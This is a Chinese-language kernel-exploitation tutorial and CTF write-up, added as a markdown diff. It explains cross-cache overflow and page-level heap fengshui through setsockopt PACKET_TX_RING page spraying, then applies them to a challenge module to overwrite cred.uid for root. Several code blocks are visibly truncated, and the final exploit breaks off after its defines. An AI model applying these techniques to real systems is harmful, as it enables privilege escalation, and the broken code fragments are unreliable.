@@ -1,0 +1,183 @@
+# Cross-Cache Overflow & Page-level Heap Fengshui
+> 注：这是两种联合起来的利用手法。
+## Cross-Cache Overflow
+与我们此前一直关注于 slub allocator 的各种利用手法不同，**Cross-Cache Overflow** 实际上是**针对 buddy system** 的利用手法，其主要基于如下思路：
+- slub allocator 底层逻辑是向 buddy system 请求页面后再划分成特定大小 object 返还给上层调用者。
+  - 内存中用作不同 `kmem_cache` 的页面在内存上是有可能相邻的。
+- 若我们的漏洞对象存在于页面 A，溢出目标对象存在于页面 B，且 A、B两页面相邻，则我们便有可能实现跨越不同 `kmem_cache` 之间的堆溢出。
+**Cross-Cache Overflow 打破了不同 kmem\_cache 之间的阻碍，可以让我们的溢出漏洞对近乎任意的内核结构体进行覆写。**
+但这需要达成非常严苛的页级堆排布，而内核的堆页面布局对我们而言通常是未知的，因此我们需要想办法将其变为已知的内存布局，这就需要**页级堆风水**——
+## Page-level Heap Fengshui
+顾名思义，**页级堆风水**即以内存页为粒度的内存排布方式，而内核内存页的排布对我们来说不仅未知且信息量巨大，因此这种利用手法实际上是让我们**手工构造一个新的已知的页级粒度内存页排布**。
+首先让我们重新审视 slub allocator 向 buddy system 请求页面的过程，当 freelist page 已经耗空且 partial 链表也为空时（或者 `kmem_cache` 刚刚创建后进行第一次分配时），其会向 buddy system 申请页面：
+接下来让我们重新审视 buddy system ，其基本原理就是以 2 的 order 次幂张内存页作为分配粒度，相同 order 间空闲页面构成双向链表，当低阶 order 的页面不够用时便会从高阶 order 取一份连续内存页拆成两半，其中一半挂回当前请求 order 链表，另一半返还给上层调用者；下图为以 order 2 为例的 buddy system 页面分配基本原理：
+我们不难想到的是：从更高阶 order 拆分成的两份低阶 order 的连续内存页**是物理连续的**，由此我们可以：
+- 向 buddy system 请求两份连续的内存页。
+- 释放其中一份内存页，在 `vulnerable kmem_cache` 上堆喷，让其取走这份内存页。
+- 释放另一份内存页，在 `victim kmem_cache` 上堆喷，让其取走这份内存页。
+**此时我们便有可能溢出到其他的内核结构体上，从而完成 cross-cache overflow**
+### 使用 setsockopt 与 pgv 完成页级内存占位与堆风水
+那么我们该如何完成这样的页占位与页排布呢？笔者这里给出一个来自于 [CVE-2017-7308](https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html) 的方案：
+当我们创建一个 protocol 为 `PF_PACKET` 的 socket 之后，先调用 `setsockopt()` 将 `PACKET_VERSION` 设为  `TPACKET_V1 `/ `TPACKET_V2`，再调用 `setsockopt()` 提交一个 `PACKET_TX_RING` ，此时便存在如下调用链：
+```c
+__sys_setsockopt()
+    sock->ops->setsockopt()
+    	packet_setsockopt() // case PACKET_TX_RING ↓
+    		packet_set_ring()
+    			alloc_pg_vec()
+```
+在 `alloc_pg_vec()` 中会创建一个 `pgv` 结构体，用以分配 `tp_block_nr` 份 2order 张内存页，其中 `order` 由 `tp_block_size` 决定：
+```c
+static struct pgv *alloc_pg_vec(struct tpacket_req *req, int order)
+{
+	unsigned int block_nr = req->tp_block_nr;
+	struct pgv *pg_vec;
+	int i;
+	pg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL | __GFP_NOWARN);
+	if (unlikely(!pg_vec))
+		goto out;
+	for (i = 0; i  [官方 writeup 见此处](https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html)
+### 题目分析
+题目文件连 `kconfig` 都给了，笔者表示非常感动：
+```shell
+$ tree .
+.
+├── bzImage
+├── initramfs.cpio.gz
+├── kconfig
+└── run
+0 directories, 4 files
+```
+启动脚本看都不用看就知道开了 SMEP、SMAP、KPTI（基本上已经是内核题标配了）：
+```bash
+#!/bin/sh
+exec qemu-system-x86_64 \
+    -m 4096M \
+    -nographic \
+    -kernel bzImage \
+    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on" \
+    -netdev user,id=net \
+    -device e1000,netdev=net \
+    -no-reboot \
+    -monitor /dev/null \
+    -cpu qemu64,+smep,+smap \
+    -initrd initramfs.cpio.gz \
+```
+在启动脚本里加载了一个名为 `cache_of_castaway.ko` 的 LKM，按惯例丢进 IDA，在模块初始化时注册了设备并创建了一个 `kmem_cache`，分配的 object 的 size 为 `512`，创建 flag 为 `SLAB_ACCOUNT | SLAB_PANIC`，同时开启了 `CONFIG_MEMCG_KMEM=y`，这意味着这是一个**独立的 kmem\_cache**：
+```c
+__int64 init_module()
+{
+  __int64 result; // rax
+  castaway_dev = 255;
+  qword_8A8 = (__int64)"castaway";
+  qword_8B0 = (__int64)&castaway_fops;
+  _mutex_init(&castaway_lock, "&castaway_lock", &_key_28999);
+  if ( !(unsigned int)misc_register(&castaway_dev)
+    && (castaway_arr = kmem_cache_alloc(kmalloc_caches[12], 3520LL)) != 0
+    && (castaway_cachep = kmem_cache_create("castaway_cache", 0x200LL, 1LL, 0x4040000LL, 0LL)) != 0 )
+  {
+    result = init_castaway_driver_cold();
+  }
+  else
+  {
+    result = 0xFFFFFFFFLL;
+  }
+  return result;
+}
+```
+设备只定义了一个 ioctl，其中包含分配与编辑堆块的功能且都有锁，最多可以分配 400 个 object，没有释放功能：
+```c
+__int64 __fastcall castaway_ioctl(__int64 a1, int a2, __int64 a3)
+{
+  __int64 v3; // r12
+  _QWORD *v5; // rbx
+  unsigned __int64 v6[6]; // [rsp+0h] [rbp-30h] BYREF
+  v6[3] = __readgsqword(0x28u);
+  if ( a2 != 0xCAFEBABE )
+  {
+    if ( copy_from_user(v6, a3, 24LL) )
+      return -1LL;
+    mutex_lock(&castaway_lock);
+    if ( a2 == 0xF00DBABE )
+      v3 = castaway_edit(v6[0], v6[1], v6[2]);
+    else
+      v3 = -1LL;
+LABEL_5:
+    mutex_unlock(&castaway_lock);
+    return v3;
+  }
+  mutex_lock(&castaway_lock);
+  v3 = castaway_ctr;
+  if ( castaway_ctr  0x18F )
+    return castaway_edit_cold();
+  if ( !*(_QWORD *)(castaway_arr + 8 * a1) )
+    return castaway_edit_cold();
+  if ( a2 > 0x200 )
+    return castaway_edit_cold();
+  _check_object_size(src, a2, 0LL);
+  if ( copy_from_user(src, a3, a2) )
+    return castaway_edit_cold();
+  memcpy((void *)(*(_QWORD *)(castaway_arr + 8 * a1) + 6LL), src, a2);
+  return a2;
+}
+```
+编辑堆块时我们应当向内核中传入如下结构：
+```c
+struct request {
+    int64_t index;
+    size_t	size;
+    void 	*buf;
+};
+```
+### 漏洞利用
+#### Step.I - cross-cache overflow
+由于我们的漏洞对象位于独立的 `kmem_cache` 中，因此其不会与内核中的其他常用结构体的分配混用，我们无法直接通过 slub 层的堆喷 + 堆风水来溢出到其他结构体来进行下一步利用；同时由于 slub 并不会像 glibc 的ptmalloc2 那样在每个 object 开头都有个存储数据的 header，而是将 next 指针放在一个随机的位置，我们很难直接溢出到下一个 object 的 next 域，由于 hardened freelist 的存在就算我们能溢出到下一个相邻 object 的 next 域也没法构造出一个合法的指针；而在我们的 slub 页面相邻的页面上的数据对我们来说也是未知的，直接溢出的话我们并不知道能够溢出到什么页面上 :（
+那么我们真的就没有任何办法了吗？答案自然是否定的，让我们把目光重新放到 slub allocator 上，当 freelist page 已经耗空且 partial 链表也为空时（或者 `kmem_cache` 刚刚创建后进行第一次分配时），其会向 buddy system 申请页面：
+buddy system 的基本原理就是以 2 的 order 次幂张内存页作为分配粒度，相同 order 间空闲页面构成双向链表，当低阶 order 的页面不够用时便会从高阶 order 取一份连续内存页拆成两半，其中一半挂回当前请求 order 链表，另一半返还给上层调用者；下图为以 order 2 为例的 buddy system 页面分配基本原理：
+我们不难想到的是：从更高阶 order 拆分成的两份低阶 order 的连续内存页**是物理连续的**，若其中的一份被我们的 `kmem_cache` 取走，而另一份被用于分配其他内核结构体的 `kmem_cache` 取走，**则我们便有可能溢出到其他的内核结构体上**——这便是 **`cross-cache overflow`**。
+具体的溢出对象也并不难想——6个字节刚好足够我们溢出到 `cred` 结构体的 `uid` 字段，完成提权，那么如何溢出到我们想要提权的进程的 cred 结构体呢？我们只需要先 fork() 堆喷 cred 耗尽 `cred_jar ` 中 object，让其向 buddy system 请求新的页面即可，我们还需要先堆喷消耗 buddy system 中原有的页面，之后我们再分配 cred 和题目 object，两者便有较大概率相邻。
+`cred` 的大小为 `192`，`cred_jar` 向 buddy system 单次请求的页面数量为 1，足够分配 21 个 cred，因此我们不需要堆喷太多 `cred` 便能耗尽 `cred_jar`，不过 `fork()` 在执行过程中会产生很多的”噪声“（即额外分配一些我们不需要的结构体，从而影响页布局），因此这里我们改用 `clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND)`。
+> 关于”噪声“问题参见 [bsauce 师傅的博客](https://bsauce.github.io/2022/11/07/castaways/#2-3-fork%E5%99%AA%E5%A3%B0%E9%97%AE%E9%A2%98)，笔者暂未深入阅读过 `fork()` 相关源码。
+由于 slub pages 并不会在释放后立刻被返还给 buddy system，因此我们最好寻找一些会**直接调用向 buddy system 请求页面的 API 的结构**，这里笔者选择参照官方 writeup 中参照 D3v17 在 [CVE-2017-7308](https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html) 中使用 `setsockopt()` 进行页喷射的方法：当我们创建一个 protocol 为 `PF_PACKET` 的 socket 之后，先调用 `setsockopt()` 将 `PACKET_VERSION` 设为  `TPACKET_V1 `/ `TPACKET_V2`，再调用 `setsockopt()` 提交一个 `PACKET_TX_RING` ，此时便存在如下调用链：
+```c
+__sys_setsockopt()
+    sock->ops->setsockopt()
+    	packet_setsockopt() // case PACKET_TX_RING ↓
+    		packet_set_ring()
+    			alloc_pg_vec()
+```
+在 `alloc_pg_vec()` 中会创建一个 `pgv` 结构体，用以分配 `tp_block_nr` 份 2order 张内存页，其中 `order` 由 `tp_block_size` 决定：
+```c
+static struct pgv *alloc_pg_vec(struct tpacket_req *req, int order)
+{
+	unsigned int block_nr = req->tp_block_nr;
+	struct pgv *pg_vec;
+	int i;
+	pg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL | __GFP_NOWARN);
+	if (unlikely(!pg_vec))
+		goto out;
+	for (i = 0; i uid` ，完成提权。
+我们的子进程需要轮询等待自己的 uid 变为 root，但是这种做法并不优雅：) ，所以笔者这里选择用一个新的管道在主进程与子进程间通信，当子进程从管道中读出1字节时便开始检查自己是否成功提权，若未提权则直接 sleep 即可。
+### EXPLOIT
+最后的 exp 如下：
+```c
+#define _GNU_SOURCE
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+#define PGV_PAGE_NUM 1000
+#define PGV_CRED_START (PGV_PAGE_NUM / 2)
+#define CRED_SPRAY_NUM 514
+#define PACKET_VERSION 10
+#define PACKET_TX_RING 13
+#define VUL_OBJ_NUM 400
